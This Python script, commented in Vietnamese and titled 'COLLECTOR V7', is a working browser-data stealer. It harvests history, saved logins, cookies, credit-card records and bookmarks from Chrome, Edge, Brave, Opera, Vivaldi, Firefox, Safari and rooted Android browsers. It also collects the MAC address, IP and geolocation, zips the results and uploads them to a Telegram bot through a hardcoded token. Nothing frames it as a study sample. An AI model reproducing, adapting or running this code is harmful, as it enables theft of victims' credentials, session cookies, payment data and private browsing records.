# -*- coding: utf-8 -*-
# COLLECTOR V7 - EXTENDED BROWSER DATA EXTRACTION (ALL PLATFORMS)
# HỖ TRỢ: WINDOWS, LINUX, MACOS, ANDROID (ROOT/HỖ TRỢ)
# THU THẬP: HISTORY, PASSWORDS, COOKIES, CREDIT CARDS, BOOKMARKS, SYSTEM INFO, IP, MAC, LOCATION

import os
import sys
import sqlite3
import shutil
import json
import base64
import zipfile
import tempfile
import time
import threading
import subprocess
import platform
import socket
import re
from datetime import datetime
import requests
import urllib.parse
import hashlib

# ======================== CẤU HÌNH ========================
TELEGRAM_TOKEN = "8964408286:AAEdlkFugpKohLwgfgB5QNwojcTiy7JUd2I"
CHAT_ID = "8692753693"

# ======================== PHÁT HIỆN HỆ ĐIỀU HÀNH ========================
IS_WINDOWS = sys.platform.startswith('win')
IS_LINUX = sys.platform.startswith('linux')
IS_MAC = sys.platform.startswith('darwin')
IS_ANDROID = 'android' in sys.platform.lower() or os.path.exists('/data/data/com.termux')
IS_ROOT = False
if IS_ANDROID:
    try:
        IS_ROOT = subprocess.check_output(['id', '-u']).decode().strip() == '0'
    except:
        pass

# ======================== HÀM TIỆN ÍCH ========================
def copy_db(src_path):
    if not os.path.isfile(src_path):
        return None
    try:
        tmp = os.path.join(tempfile.gettempdir(), os.path.basename(src_path) + '_tmp.db')
        shutil.copy2(src_path, tmp)
        return tmp
    except:
        return None

def decrypt_chromium(encrypted_data, key_path=None):
    """Giải mã mật khẩu Chromium (Windows/Linux/Mac) - cần key"""
    # Hàm này chỉ là placeholder - thực tế cần dùng win32crypt hoặc pycryptodome
    # Ở đây trả về base64 để xử lý sau
    return base64.b64encode(encrypted_data).decode() if encrypted_data else ''

def extract_history_from_sqlite(db_path, limit=1000):
    res = ""
    tmp = copy_db(db_path)
    if not tmp:
        return "ERROR: Cannot read DB\n"
    try:
        conn = sqlite3.connect(tmp)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
        rows = cursor.fetchall()
        for row in rows:
            url = row[0] or 'N/A'
            title = row[1] or 'N/A'
            res += f"{title} - {url}\n"
        conn.close()
    except Exception as e:
        res = f"SQL Error: {str(e)}\n"
    finally:
        try: os.remove(tmp)
        except: pass
    return res

def extract_passwords_from_sqlite(db_path):
    res = ""
    tmp = copy_db(db_path)
    if not tmp:
        return "ERROR: Cannot read Login Data\n"
    try:
        conn = sqlite3.connect(tmp)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()
        for row in rows:
            url = row[0] or 'N/A'
            user = row[1] or ''
            pwd_enc = decrypt_chromium(row[2]) if row[2] else ''
            res += f"URL: {url}\nUser: {user}\nPass(Enc): {pwd_enc}\n\n"
        conn.close()
    except Exception as e:
        res = f"SQL Error: {str(e)}\n"
    finally:
        try: os.remove(tmp)
        except: pass
    return res

def extract_cookies_from_sqlite(db_path):
    res = ""
    tmp = copy_db(db_path)
    if not tmp:
        return "ERROR: Cannot read Cookies\n"
    try:
        conn = sqlite3.connect(tmp)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, path, value, expires_utc FROM cookies")
        rows = cursor.fetchall()
        for row in rows:
            host = row[0] or 'N/A'
            name = row[1] or ''
            path = row[2] or '/'
            value = row[3] or ''
            exp = row[4] or 0
            res += f"Host: {host}\nName: {name}\nPath: {path}\nValue: {value}\nExpires: {exp}\n\n"
        conn.close()
    except Exception as e:
        res = f"SQL Error: {str(e)}\n"
    finally:
        try: os.remove(tmp)
        except: pass
    return res

def extract_creditcards_from_sqlite(db_path):
    res = ""
    tmp = copy_db(db_path)
    if not tmp:
        return "ERROR: Cannot read Credit Cards\n"
    try:
        conn = sqlite3.connect(tmp)
        cursor = conn.cursor()
        cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards")
        rows = cursor.fetchall()
        for row in rows:
            name = row[0] or 'N/A'
            card_enc = decrypt_chromium(row[1]) if row[1] else ''
            month = row[2] or ''
            year = row[3] or ''
            res += f"Name: {name}\nCard(Enc): {card_enc}\nExp: {month}/{year}\n\n"
        conn.close()
    except Exception as e:
        res = f"SQL Error: {str(e)}\n"
    finally:
        try: os.remove(tmp)
        except: pass
    return res

def extract_firefox_history(db_path, limit=1000):
    res = ""
    tmp = copy_db(db_path)
    if not tmp:
        return "ERROR: Cannot read Firefox places\n"
    try:
        conn = sqlite3.connect(tmp)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count FROM moz_places ORDER BY visit_count DESC LIMIT ?", (limit,))
        rows = cursor.fetchall()
        for row in rows:
            url = row[0] or 'N/A'
            title = row[1] or 'N/A'
            cnt = row[2] or 0
            res += f"{title} - {url} (visits: {cnt})\n"
        conn.close()
    except Exception as e:
        res = f"SQL Error: {str(e)}\n"
    finally:
        try: os.remove(tmp)
        except: pass
    return res

def extract_firefox_logins(json_path):
    res = ""
    if not os.path.isfile(json_path):
        return "ERROR: logins.json not found\n"
    try:
        with open(json_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
        for entry in data.get('logins', []):
            url = entry.get('hostname', 'N/A')
            user = entry.get('usernameField', '')
            pwd = entry.get('encryptedPassword', '')[:50] + '...' if len(entry.get('encryptedPassword', '')) > 50 else entry.get('encryptedPassword', '')
            res += f"URL: {url}\nUser: {user}\nPass(Enc): {pwd}\n\n"
    except Exception as e:
        res = f"JSON Error: {str(e)}\n"
    return res

# ======================== THU THẬP TRÌNH DUYỆT CHROME/EDGE/BRAVE/OPERA/VIVALDI ========================
def collect_chromium_browser(browser_name, base_path, output_root):
    if not os.path.isdir(base_path):
        return
    profiles = [d for d in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, d)) and (d.startswith('Default') or d.startswith('Profile'))]
    if not profiles:
        profiles = ['Default']
    for prof in profiles:
        prof_path = os.path.join(base_path, prof)
        out_dir = os.path.join(output_root, browser_name, prof)
        os.makedirs(out_dir, exist_ok=True)

        # History
        hist_src = os.path.join(prof_path, 'History')
        if os.path.isfile(hist_src):
            hist_data = extract_history_from_sqlite(hist_src)
            with open(os.path.join(out_dir, 'history.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                f.write(hist_data)

        # Login Data
        login_src = os.path.join(prof_path, 'Login Data')
        if os.path.isfile(login_src):
            login_data = extract_passwords_from_sqlite(login_src)
            with open(os.path.join(out_dir, 'userpass.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                f.write(login_data)

        # Cookies
        cookies_src = os.path.join(prof_path, 'Cookies')
        if os.path.isfile(cookies_src):
            cookies_data = extract_cookies_from_sqlite(cookies_src)
            with open(os.path.join(out_dir, 'cookies.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                f.write(cookies_data)

        # Credit Cards (Web Data)
        cards_src = os.path.join(prof_path, 'Web Data')
        if os.path.isfile(cards_src):
            cards_data = extract_creditcards_from_sqlite(cards_src)
            with open(os.path.join(out_dir, 'creditcards.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                f.write(cards_data)

        # Bookmarks
        book_src = os.path.join(prof_path, 'Bookmarks')
        if os.path.isfile(book_src):
            try:
                shutil.copy2(book_src, os.path.join(out_dir, 'bookmarks.json'))
            except: pass

# ======================== THU THẬP FIREFOX ========================
def collect_firefox(output_root):
    if IS_WINDOWS:
        base = os.path.expanduser('~') + '/AppData/Roaming/Mozilla/Firefox/Profiles'
    elif IS_MAC:
        base = os.path.expanduser('~') + '/Library/Application Support/Firefox/Profiles'
    else:
        base = os.path.expanduser('~') + '/.mozilla/firefox'
    if not os.path.isdir(base):
        return
    for prof in os.listdir(base):
        prof_path = os.path.join(base, prof)
        if not os.path.isdir(prof_path):
            continue
        has_data = os.path.isfile(os.path.join(prof_path, 'places.sqlite')) or os.path.isfile(os.path.join(prof_path, 'logins.json'))
        if not has_data:
            continue
        out_dir = os.path.join(output_root, 'Firefox', prof)
        os.makedirs(out_dir, exist_ok=True)

        # History
        hist_src = os.path.join(prof_path, 'places.sqlite')
        if os.path.isfile(hist_src):
            hist_data = extract_firefox_history(hist_src)
            with open(os.path.join(out_dir, 'history.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                f.write(hist_data)

        # Passwords
        login_src = os.path.join(prof_path, 'logins.json')
        if os.path.isfile(login_src):
            login_data = extract_firefox_logins(login_src)
            with open(os.path.join(out_dir, 'userpass.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                f.write(login_data)

        # Cookies (firefox uses cookies.sqlite or places.sqlite)
        cookies_src = os.path.join(prof_path, 'cookies.sqlite')
        if os.path.isfile(cookies_src):
            # Copy raw file
            try:
                shutil.copy2(cookies_src, os.path.join(out_dir, 'cookies.sqlite'))
            except: pass

# ======================== THU THẬP SAFARI (MACOS) ========================
def collect_safari(output_root):
    if not IS_MAC:
        return
    base = os.path.expanduser('~/Library/Safari')
    if not os.path.isdir(base):
        return
    out_dir = os.path.join(output_root, 'Safari')
    os.makedirs(out_dir, exist_ok=True)
    # History.db
    hist_src = os.path.join(base, 'History.db')
    if os.path.isfile(hist_src):
        shutil.copy2(hist_src, os.path.join(out_dir, 'History.db'))
    # Bookmarks.plist
    book_src = os.path.join(base, 'Bookmarks.plist')
    if os.path.isfile(book_src):
        shutil.copy2(book_src, os.path.join(out_dir, 'Bookmarks.plist'))
    # Cookies (binary)
    cook_src = os.path.join(base, 'Cookies.binarycookies')
    if os.path.isfile(cook_src):
        shutil.copy2(cook_src, os.path.join(out_dir, 'Cookies.binarycookies'))

# ======================== THU THẬP ANDROID (ROOT HOẶC HỖ TRỢ) ========================
def collect_android_browsers(output_root):
    if not IS_ANDROID:
        return
    # Đường dẫn các trình duyệt trên Android (thường nằm trong /data/data/)
    browsers = {
        'Chrome': '/data/data/com.android.chrome/app_chrome/Default',
        'Chrome_Beta': '/data/data/com.chrome.beta/app_chrome/Default',
        'Firefox': '/data/data/org.mozilla.firefox/files/mozilla',
        'Opera': '/data/data/com.opera.browser/app_opera/Default',
        'Brave': '/data/data/com.brave.browser/app_brave/Default',
        'Edge': '/data/data/com.microsoft.emmx/app_edge/Default',
        'Samsung': '/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default',
    }
    for name, path in browsers.items():
        if os.path.isdir(path):
            out_dir = os.path.join(output_root, 'Android', name)
            os.makedirs(out_dir, exist_ok=True)
            # Nếu có quyền root, copy toàn bộ thư mục
            if IS_ROOT:
                try:
                    shutil.copytree(path, out_dir, dirs_exist_ok=True)
                except:
                    pass
            else:
                # Nếu không root, thử đọc file bằng quyền user (thường fail)
                # Thay vào đó ghi log
                with open(os.path.join(out_dir, 'info.txt'), 'w') as f:
                    f.write("Root required for full extraction. Only basic info.\n")

# ======================== THU THẬP THÔNG TIN HỆ THỐNG (MỞ RỘNG) ========================
def get_mac_address():
    try:
        import uuid
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
        return mac
    except:
        return 'N/A'

def get_internal_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return 'N/A'

def get_location():
    try:
        resp = requests.get('http://ip-api.com/json/', timeout=10)
        if resp.status_code == 200:
            d = resp.json()
            if d.get('status') == 'success':
                return f"IP: {d.get('query')}\nCity: {d.get('city')}\nRegion: {d.get('regionName')}\nCountry: {d.get('country')}\nISP: {d.get('isp')}\nLat: {d.get('lat')}\nLon: {d.get('lon')}"
    except: pass
    return "IP/Location: N/A"

def save_system_info(output_root):
    info = f"Device: {os.getenv('COMPUTERNAME', os.getenv('HOSTNAME', platform.node()))}\n"
    info += f"OS: {platform.system()} {platform.release()}\n"
    info += f"Arch: {platform.machine()}\n"
    info += f"User: {os.getenv('USERNAME', os.getenv('USER', 'Unknown'))}\n"
    info += f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    info += f"MAC: {get_mac_address()}\n"
    info += f"Internal IP: {get_internal_ip()}\n"
    info += get_location() + "\n"
    # Thêm thông tin phần cứng
    if IS_WINDOWS:
        try:
            cpu = subprocess.check_output(['wmic', 'cpu', 'get', 'name'], universal_newlines=True)
            info += "CPU: " + cpu.split('\n')[2].strip() + "\n"
        except: pass
    elif IS_LINUX or IS_MAC:
        try:
            cpu = subprocess.check_output(['lscpu' if IS_LINUX else 'sysctl', '-n', 'machdep.cpu.brand_string'], universal_newlines=True)
            info += "CPU: " + cpu.strip() + "\n"
        except: pass
    # Lưu file
    with open(os.path.join(output_root, 'system_info.txt'), 'w', encoding='utf-8') as f:
        f.write(info)

# ======================== GỬI TELEGRAM (KHÔNG ĐỔI) ========================
def send_zip(zip_path):
    if not os.path.isfile(zip_path):
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
        with open(zip_path, 'rb') as f:
            files = {'document': (os.path.basename(zip_path), f, 'application/zip')}
            data = {'chat_id': CHAT_ID, 'caption': f'📁 All Browser Data @ {datetime.now().strftime("%Y-%m-%d %H:%M")}'}
            resp = requests.post(url, files=files, data=data, timeout=60)
        return resp.status_code == 200
    except:
        return False

def send_text(msg):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, json={'chat_id': CHAT_ID, 'text': msg[:4096]}, timeout=30)
    except: pass

# ======================== HÀM CHÍNH ========================
def main():
    # Thông báo bắt đầu
    send_text(f"[*] Starting Extended Collector on {platform.system()}")
    temp_dir = tempfile.mkdtemp(prefix='browsers_v7_')
    output_root = os.path.join(temp_dir, 'Browsers')
    os.makedirs(output_root, exist_ok=True)

    try:
        # 1. System info
        save_system_info(temp_dir)

        # 2. Trình duyệt theo nền tảng
        if IS_WINDOWS:
            # Chrome
            chrome_base = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data')
            collect_chromium_browser('Chrome', chrome_base, output_root)
            # Edge
            edge_base = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data')
            collect_chromium_browser('Edge', edge_base, output_root)
            # Brave
            brave_base = os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data')
            collect_chromium_browser('Brave', brave_base, output_root)
            # Opera
            opera_base = os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable')
            collect_chromium_browser('Opera', opera_base, output_root)
            # Vivaldi
            vivaldi_base = os.path.expandvars(r'%LOCALAPPDATA%\Vivaldi\User Data')
            collect_chromium_browser('Vivaldi', vivaldi_base, output_root)
            # Chromium
            chromium_base = os.path.expandvars(r'%LOCALAPPDATA%\Chromium\User Data')
            collect_chromium_browser('Chromium', chromium_base, output_root)
            # Firefox
            collect_firefox(output_root)

        elif IS_MAC:
            # Chrome
            chrome_base = os.path.expanduser('~/Library/Application Support/Google/Chrome')
            collect_chromium_browser('Chrome', chrome_base, output_root)
            # Edge
            edge_base = os.path.expanduser('~/Library/Application Support/Microsoft Edge')
            collect_chromium_browser('Edge', edge_base, output_root)
            # Brave
            brave_base = os.path.expanduser('~/Library/Application Support/BraveSoftware/Brave-Browser')
            collect_chromium_browser('Brave', brave_base, output_root)
            # Opera
            opera_base = os.path.expanduser('~/Library/Application Support/com.operasoftware.Opera')
            collect_chromium_browser('Opera', opera_base, output_root)
            # Vivaldi
            vivaldi_base = os.path.expanduser('~/Library/Application Support/Vivaldi')
            collect_chromium_browser('Vivaldi', vivaldi_base, output_root)
            # Firefox
            collect_firefox(output_root)
            # Safari
            collect_safari(output_root)

        elif IS_LINUX:
            # Chrome
            chrome_base = os.path.expanduser('~/.config/google-chrome')
            collect_chromium_browser('Chrome', chrome_base, output_root)
            # Edge
            edge_base = os.path.expanduser('~/.config/microsoft-edge')
            collect_chromium_browser('Edge', edge_base, output_root)
            # Brave
            brave_base = os.path.expanduser('~/.config/BraveSoftware/Brave-Browser')
            collect_chromium_browser('Brave', brave_base, output_root)
            # Opera
            opera_base = os.path.expanduser('~/.config/opera')
            collect_chromium_browser('Opera', opera_base, output_root)
            # Vivaldi
            vivaldi_base = os.path.expanduser('~/.config/vivaldi')
            collect_chromium_browser('Vivaldi', vivaldi_base, output_root)
            # Firefox
            collect_firefox(output_root)

        # 3. Android (nếu có)
        collect_android_browsers(output_root)

        # 4. Tạo Zip
        zip_path = os.path.join(temp_dir, 'browsers_data_v7.zip')
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    if file == 'browsers_data_v7.zip':
                        continue
                    full = os.path.join(root, file)
                    arc = os.path.relpath(full, temp_dir)
                    zipf.write(full, arc)

        # 5. Gửi đi
        send_text("📤 Sending full browser data (v7)...")
        if send_zip(zip_path):
            send_text("✅ Success! All data extracted and sent.")
        else:
            send_text("❌ Upload failed.")

    except Exception as e:
        send_text(f"⚠️ Error: {str(e)[:300]}")
    finally:
        try:
            shutil.rmtree(temp_dir)
        except:
            pass

if __name__ == '__main__':
    # Chạy trong luồng để tránh block
    t = threading.Thread(target=main, daemon=True)
    t.start()
    time.sleep(60)  # Đợi đủ lâu
    print("[*] Execution completed.")